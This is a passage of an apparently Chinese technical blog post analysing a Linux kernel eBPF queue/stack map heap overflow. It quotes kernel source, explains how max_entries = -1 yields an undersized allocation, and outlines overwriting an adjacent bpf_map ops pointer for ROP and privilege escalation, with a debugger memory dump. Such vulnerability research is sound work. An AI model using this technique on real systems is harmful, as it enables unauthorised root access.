class="line">rcu_read_lock();</span><br><span class="line">err = bpf_fd_array_map_update_elem(<span class="built_in">map</span>, f.file, key, value,</span><br><span class="line">   attr-&gt;flags);</span><br><span class="line">rcu_read_unlock();</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_HASH_OF_MAPS) &#123;</span><br><span class="line">rcu_read_lock();</span><br><span class="line">err = bpf_fd_htab_map_update_elem(<span class="built_in">map</span>, f.file, key, value,</span><br><span class="line">  attr-&gt;flags);</span><br><span class="line">rcu_read_unlock();</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_REUSEPORT_SOCKARRAY) &#123;</span><br><span class="line"><span class="comment">/* rcu_read_lock() is not needed */</span></span><br><span class="line">err = bpf_fd_reuseport_array_update_elem(<span class="built_in">map</span>, key, value,</span><br><span class="line"> attr-&gt;flags);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_QUEUE ||</span><br><span class="line">   <span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_STACK) &#123;</span><br><span class="line">err = <span class="built_in">map</span>-&gt;ops-&gt;map_push_elem(<span class="built_in">map</span>, value, attr-&gt;flags);[<span class="number">8</span>]</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">rcu_read_lock();</span><br><span class="line">err = <span class="built_in">map</span>-&gt;ops-&gt;map_update_elem(<span class="built_in">map</span>, key, value, attr-&gt;flags);</span><br><span class="line">rcu_read_unlock();</span><br><span class="line">&#125;</span><br><span class="line">__this_cpu_dec(bpf_prog_active);</span><br><span class="line">preempt_enable();</span><br><span class="line">maybe_wait_bpf_programs(<span class="built_in">map</span>);</span><br><span class="line">out:</span><br><span class="line">free_value:</span><br><span class="line">kfree(value);</span><br><span class="line">free_key:</span><br><span class="line">kfree(key);</span><br><span class="line">err_put:</span><br><span class="line">fdput(f);</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果 这时候 我们传入的 attr 中的 map_type 为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">map-&gt;map_type == BPF_MAP_TYPE_QUEUE ||</span><br><span class="line">map-&gt;map_type == BPF_MAP_TYPE_STACK</span><br></pre></td></tr></table></figure><p>那么我们就可以进入到：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">queue_stack_map_push_elem</span><span class="params">(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *value,</span></span></span><br><span class="line"><span class="function"><span class="params">     u64 flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_queue_stack</span> *<span class="title">qs</span> = <span class="title">bpf_queue_stack</span>(<span class="title">map</span>);</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> irq_flags;</span><br><span class="line"><span class="keyword">int</span> err = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">void</span> *dst;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* BPF_EXIST is used to force making room for a new element in case the</span></span><br><span class="line"><span class="comment"> * map is full</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">bool</span> replace = (flags &amp; BPF_EXIST);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Check supported flags for queue and stack maps */</span></span><br><span class="line"><span class="keyword">if</span> (flags &amp; BPF_NOEXIST || flags &gt; BPF_EXIST)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">raw_spin_lock_irqsave(&amp;qs-&gt;lock, irq_flags);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (queue_stack_map_is_full(qs)) &#123;</span><br><span class="line"><span class="keyword">if</span> (!replace) &#123;</span><br><span class="line">err = -E2BIG;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* advance tail pointer to overwrite oldest element */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(++qs-&gt;tail &gt;= qs-&gt;size))</span><br><span class="line">qs-&gt;tail = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dst = &amp;qs-&gt;elements[qs-&gt;head * qs-&gt;<span class="built_in">map</span>.value_size];</span><br><span class="line"><span class="built_in">memcpy</span>(dst, value, qs-&gt;<span class="built_in">map</span>.value_size);  [<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(++qs-&gt;head &gt;= qs-&gt;size))</span><br><span class="line">qs-&gt;head = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">raw_spin_unlock_irqrestore(&amp;qs-&gt;lock, irq_flags);</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这时候的 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">memcpy(dst, value, qs-&gt;map.value_size);</span><br></pre></td></tr></table></figure><p>就能发生溢出，而 qs 是可控的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dst = &amp;qs-&gt;elements[qs-&gt;head * qs-&gt;map.value_size];</span><br><span class="line">value &lt;- uvalue &lt;- u64_to_user_ptr(attr-&gt;value);</span><br></pre></td></tr></table></figure><p>这两个也可控的。如果size 大于 dst 的大小，就能造成溢出</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>cmd 命令的定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> bpf_cmd &#123;</span><br><span class="line">BPF_MAP_CREATE,</span><br><span class="line">BPF_MAP_LOOKUP_ELEM,</span><br><span class="line">BPF_MAP_UPDATE_ELEM,</span><br><span class="line">BPF_MAP_DELETE_ELEM,</span><br><span class="line">BPF_MAP_GET_NEXT_KEY,</span><br><span class="line">BPF_PROG_LOAD,</span><br><span class="line">BPF_OBJ_PIN,</span><br><span class="line">BPF_OBJ_GET,</span><br><span class="line">BPF_PROG_ATTACH,</span><br><span class="line">BPF_PROG_DETACH,</span><br><span class="line">BPF_PROG_TEST_RUN,</span><br><span class="line">BPF_PROG_GET_NEXT_ID,</span><br><span class="line">BPF_MAP_GET_NEXT_ID,</span><br><span class="line">BPF_PROG_GET_FD_BY_ID,</span><br><span class="line">BPF_MAP_GET_FD_BY_ID,</span><br><span class="line">BPF_OBJ_GET_INFO_BY_FD,</span><br><span class="line">BPF_PROG_QUERY,</span><br><span class="line">BPF_RAW_TRACEPOINT_OPEN,</span><br><span class="line">BPF_BTF_LOAD,</span><br><span class="line">BPF_BTF_GET_FD_BY_ID,</span><br><span class="line">BPF_TASK_FD_QUERY,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>然后再看看  attr 所在的结构体是什么样子的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> bpf_attr attr = &#123;&#125;; <span class="comment">// 可见attr是一个union的结构体，会根据场景的不同，而选择不同的结构体</span></span><br></pre></td></tr></table></figure><p>根据场景可以看出attr是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> bpf_attr &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span> <span class="comment">/* anonymous struct used by BPF_MAP_CREATE command */</span></span><br><span class="line">__u32map_type;<span class="comment">/* one of enum bpf_map_type */</span></span><br><span class="line">__u32key_size;<span class="comment">/* size of key in bytes */</span></span><br><span class="line">__u32value_size;<span class="comment">/* size of value in bytes */</span></span><br><span class="line">__u32max_entries;<span class="comment">/* max number of entries in a map */</span></span><br><span class="line">__u32map_flags;<span class="comment">/* BPF_MAP_CREATE related</span></span><br><span class="line"><span class="comment"> * flags defined above.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">__u32inner_map_fd;<span class="comment">/* fd pointing to the inner map */</span></span><br><span class="line">__u32numa_node;<span class="comment">/* numa node (effective only if</span></span><br><span class="line"><span class="comment"> * BPF_F_NUMA_NODE is set).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">char</span>map_name[BPF_OBJ_NAME_LEN];</span><br><span class="line">__u32map_ifindex;<span class="comment">/* ifindex of netdev to create on */</span></span><br><span class="line">__u32btf_fd;<span class="comment">/* fd pointing to a BTF type data */</span></span><br><span class="line">__u32btf_key_type_id;<span class="comment">/* BTF type_id of the key */</span></span><br><span class="line">__u32btf_value_type_id;<span class="comment">/* BTF type_id of the value */</span></span><br><span class="line">&#125;;</span><br><span class="line">*******</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_queue_stack</span> *<span class="title">qs</span>;</span></span><br><span class="line"><span class="comment">//qs 是 bpf_queue_stack结构的</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_queue_stack</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> <span class="title">map</span>;</span>   <span class="comment">//bpf_map</span></span><br><span class="line"><span class="keyword">raw_spinlock_t</span> lock;</span><br><span class="line">u32 head, tail;</span><br><span class="line">u32 size; <span class="comment">/* max_entries + 1 */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> elements[<span class="number">0</span>] __aligned(<span class="number">8</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> &#123;</span></span><br><span class="line"><span class="comment">/* The first two cachelines with read-mostly members of which some</span></span><br><span class="line"><span class="comment"> * are also accessed in fast-path (e.g. ops, max_entries).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_ops</span> *<span class="title">ops</span> ____<span class="title">cacheline_aligned</span>;</span><span class="comment">//   bpf_map_ops结构</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">inner_map_meta</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line"><span class="keyword">void</span> *security;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">enum</span> bpf_map_type map_type;</span><br><span class="line">u32 key_size;</span><br><span class="line">u32 value_size;</span><br><span class="line">u32 max_entries;</span><br><span class="line">u32 map_flags;</span><br><span class="line">u32 pages;</span><br><span class="line">u32 id;</span><br><span class="line"><span class="keyword">int</span> numa_node;</span><br><span class="line">u32 btf_key_type_id;</span><br><span class="line">u32 btf_value_type_id;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">btf</span> *<span class="title">btf</span>;</span></span><br><span class="line"><span class="keyword">bool</span> unpriv_array;</span><br><span class="line"><span class="comment">/* 55 bytes hole */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The 3rd and 4th cacheline with misc members to avoid false sharing</span></span><br><span class="line"><span class="comment"> * particularly with refcounting.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span> ____<span class="title">cacheline_aligned</span>;</span></span><br><span class="line"><span class="keyword">atomic_t</span> refcnt;</span><br><span class="line"><span class="keyword">atomic_t</span> usercnt;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">work</span>;</span></span><br><span class="line"><span class="keyword">char</span> name[BPF_OBJ_NAME_LEN];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_ops</span> &#123;</span></span><br><span class="line"><span class="comment">/* funcs callable from userspace (via syscall) */</span></span><br><span class="line"><span class="keyword">int</span> (*map_alloc_check)(<span class="keyword">union</span> bpf_attr *attr);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *(*<span class="title">map_alloc</span>)(<span class="title">union</span> <span class="title">bpf_attr</span> *<span class="title">attr</span>);</span></span><br><span class="line"><span class="keyword">void</span> (*map_release)(struct bpf_map *<span class="built_in">map</span>, struct file *map_file);</span><br><span class="line"><span class="keyword">void</span> (*map_free)(struct bpf_map *<span class="built_in">map</span>);</span><br><span class="line"><span class="keyword">int</span> (*map_get_next_key)(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *key, <span class="keyword">void</span> *next_key);</span><br><span class="line"><span class="keyword">void</span> (*map_release_uref)(struct bpf_map *<span class="built_in">map</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* funcs callable from userspace and from eBPF programs */</span></span><br><span class="line"><span class="keyword">void</span> *(*map_lookup_elem)(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *key);</span><br><span class="line"><span class="keyword">int</span> (*map_update_elem)(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *key, <span class="keyword">void</span> *value, u64 flags);</span><br><span class="line"><span class="keyword">int</span> (*map_delete_elem)(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *key);</span><br><span class="line"><span class="keyword">int</span> (*map_push_elem)(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *value, u64 flags);</span><br><span class="line"><span class="keyword">int</span> (*map_pop_elem)(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *value);</span><br><span class="line"><span class="keyword">int</span> (*map_peek_elem)(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *value);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* funcs called by prog_array and perf_event_array map */</span></span><br><span class="line"><span class="keyword">void</span> *(*map_fd_get_ptr)(struct bpf_map *<span class="built_in">map</span>, struct file *map_file,</span><br><span class="line"><span class="keyword">int</span> fd);</span><br><span class="line"><span class="keyword">void</span> (*map_fd_put_ptr)(<span class="keyword">void</span> *ptr);</span><br><span class="line">u32 (*map_gen_lookup)(struct bpf_map *<span class="built_in">map</span>, struct bpf_insn *insn_buf);</span><br><span class="line">u32 (*map_fd_sys_lookup_elem)(<span class="keyword">void</span> *ptr);</span><br><span class="line"><span class="keyword">void</span> (*map_seq_show_elem)(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *key,</span><br><span class="line">  struct seq_file *m);</span><br><span class="line"><span class="keyword">int</span> (*map_check_btf)(<span class="keyword">const</span> struct bpf_map *<span class="built_in">map</span>,</span><br><span class="line">     <span class="keyword">const</span> struct btf_type *key_type,</span><br><span class="line">     <span class="keyword">const</span> struct btf_type *value_type);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>因为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">size = attr-&gt;max_entries + 1; [4]</span><br><span class="line">value_size = attr-&gt;value_size;[5]</span><br><span class="line">queue_size = sizeof(*qs) + (u64) value_size * size;[6]</span><br><span class="line">qs = bpf_map_area_alloc(queue_size, numa_node);[7]</span><br></pre></td></tr></table></figure><p>attr-&gt;max_entries = -1,size = 0</p><p>所以申请下来的size就是一个bpf_queue_stack的大小</p><p>最后alloc最后返回的是 <code>return &amp;qs-&gt;map;</code></p><p>上面这些是alloc会用到结构体，那下面看下<code>map_update_elem</code> 会用到的结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">map_update_elem</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"><span class="comment">//这里用到的是 bpf_attr</span></span></span><br><span class="line"><span class="function"><span class="comment">//int ufd = attr-&gt;map_fd;这里可以看出用的是</span></span></span><br><span class="line"><span class="function">struct </span>&#123; <span class="comment">/* anonymous struct used by BPF_MAP_*_ELEM commands */</span></span><br><span class="line">__u32map_fd;</span><br><span class="line">__aligned_u64key;</span><br><span class="line"><span class="keyword">union</span> &#123;</span><br><span class="line">__aligned_u64 value;</span><br><span class="line">__aligned_u64 next_key;</span><br><span class="line">&#125;;</span><br><span class="line">__u64flags;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 而其中的 value</span></span><br><span class="line"><span class="keyword">void</span> __user *uvalue = u64_to_user_ptr(attr-&gt;value);</span><br><span class="line"> <span class="comment">//转成了指针</span></span><br><span class="line">copy_from_user(value, uvalue, value_size);</span><br></pre></td></tr></table></figure><p>所以 可以通过 value来进行内容写入。</p><p>然后注意到 <code>bpf_map</code> 存储的是一个结构体，然后结构体里面有很多函数，如果能修改 <code>ops</code> 的值，那就可以进行rop，这个就有点像 tty_struct的利用。也是修改了堆风水里面的函数内存，然后栈转移，再执行rop，然后提权。</p><p>通过跟踪可以知道 qs 的size 是0x100 ，那么可以分配两个qs 然后 前一个覆盖后一个的struct bpf_map map</p><p>的最前一个 ops指针。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">0xffff88807faaf400:0xffffffff82029ba00x0000000000000000</span><br><span class="line">0xffff88807faaf410:0xffff88807b5fdf000x0000000000000017</span><br><span class="line">0xffff88807faaf420:0xffffffff000000400x0000000100000000</span><br><span class="line">0xffff88807faaf430:0xffffffff000000010x0000000000000000</span><br><span class="line">0xffff88807faaf440:0x00000000000000000x0000000000000000</span><br><span class="line">0xffff88807faaf450:0x00000000000000000x0000000000000000</span><br><span class="line">0xffff88807faaf460:0x00000000000000000x0000000000000000</span><br><span class="line">0xffff88807faaf470:0x00000000000000000x0000000000000000</span><br><span class="line">0xffff88807faaf480:0xffff88807f4b77000x0000000100000001</span><br><span class="line">0xffff88807faaf490:0x00000000000000000x0000000000000000</span><br><span class="line">0xffff88807faaf4a0:0x00000000000000000x0000000000000000</span><br><span class="line">0xffff88807faaf4b0:0x00000000000000000x0000000000000000</span><br><span class="line">0xffff88807faaf4c0:0x00000000000000010x0000000000000000</span><br><span class="line">0xffff88807faaf4d0:0x00000000000000000x0000000000000000</span><br><span class="line">0xffff88807faaf4e0:0x00000000000000000x0000000000000000</span><br><span class="line">0xffff88807faaf4f0:0x00000000000000000x0000000000000000</span><br><span class="line">0xffff88807faaf500:0xffff88807f9f9b000x0000000000000000</span><br><span class="line">0xffff88807faaf510:0xffff88807b6607c00xffff88807faaf518</span><br><span class="line">0xffff88807faaf520:0xffff88807faaf5180x0000000100000000</span><br><span class="line">0xffff88807faaf530:0x00000000000000000xffffffff82107d20</span><br><span class="line">0xffff88807faaf540:0x00000000000080fe0x0000000000000000</span><br><span class="line">0xffff88807faaf550:0x00000001000000400x0000000000000000</span><br><span class="line">0xffff88807faaf560:0x00000000000000000x0000000000000000</span><br><span class="line"> RAX  0x0</span><br><span class="line"> RBX  0xffff88807faaf400 —▸ 0xffffffff82029ba0 —▸ 0xffffffff811aedd0 ◂—   0x8b1f74d2850c578b</span><br><span class="line"> RCX  0x0</span><br><span class="line"> RDX  0x40//size</span><br><span class="line"> RDI  0xffff88807faaf4d0 ◂— 0 //目的</span><br><span class="line"> RSI  0xffff88807fa97940 ◂— 1 //源</span><br></pre></td></tr></table></figure><p>最后 在 find_and_alloc_map 里面：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">u32 type = attr-&gt;map_type;  <span class="comment">//**</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map</span>;</span></span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (type &gt;= ARRAY_SIZE(bpf_map_types))</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-EINVAL);</span><br><span class="line">type = array_index_nospec(type, ARRAY_SIZE(bpf_map_types));</span><br><span class="line">ops = bpf_map_types[type];<span class="comment">/**</span></span><br><span class="line"><span class="comment">if (!ops)</span></span><br><span class="line"><span class="comment">return ERR_PTR(-EINVAL);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">if (ops-&gt;map_alloc_check) &#123;</span></span><br><span class="line"><span class="comment">err = ops-&gt;map_alloc_check(attr);</span></span><br><span class="line"><span class="comment">if (err)</span></span><br><span class="line"><span class="comment">return ERR_PTR(err);</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">if (attr-&gt;map_ifindex)</span></span><br><span class="line"><span class="comment">ops = &amp;bpf_map_offload_ops;</span></span><br><span class="line"><span class="comment">map = ops-&gt;map_alloc(attr);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">static const struct bpf_map_ops * const bpf_map_types[] = &#123;</span></span><br><span class="line"><span class="comment">#define BPF_PROG_TYPE(_id, _ops)</span></span><br><span class="line"><span class="comment">#define BPF_MAP_TYPE(_id, _ops) \</span></span><br><span class="line"><span class="comment">[_id] = &amp;_ops,</span></span><br><span class="line"><span class="comment">#include &lt;linux/bpf_types.h&gt;</span></span><br><span class="line"><span class="comment">#undef BPF_PROG_TYPE</span></span><br><span class="line"><span class="comment">#undef BPF_MAP_TYPE</span></span><br><span class="line"><span class="comment">&#125;;</span></span><br></pre></td></tr></table></figure><p>然后就去分析了下这个结构体，如果想要执行 queue_stack_map_alloc</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_NET</span></span><br><span class="line">BPF_PROG_TYPE(BPF_PROG_TYPE_SOCKET_FILTER, sk_filter)</span><br><span class="line">BPF_PROG_TYPE(BPF_PROG_TYPE_SCHED_CLS, tc_cls_act)</span><br><span class="line">BPF_PROG_TYPE(BPF_PROG_TYPE_SCHED_ACT, tc_cls_act)</span><br><span class="line">BPF_PROG_TYPE(BPF_PROG_TYPE_XDP, xdp)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CGROUP_BPF</span></span><br><span class="line">BPF_PROG_TYPE(BPF_PROG_TYPE_CGROUP_SKB, cg_skb)</span><br><span class="line">BPF_PROG_TYPE(BPF_PROG_TYPE_CGROUP_SOCK, cg_sock)</span><br><span class="line">BPF_PROG_TYPE(BPF_PROG_TYPE_CGROUP_SOCK_ADDR, cg_sock_addr)</span><br><span class="line"><span class="meta">#<span 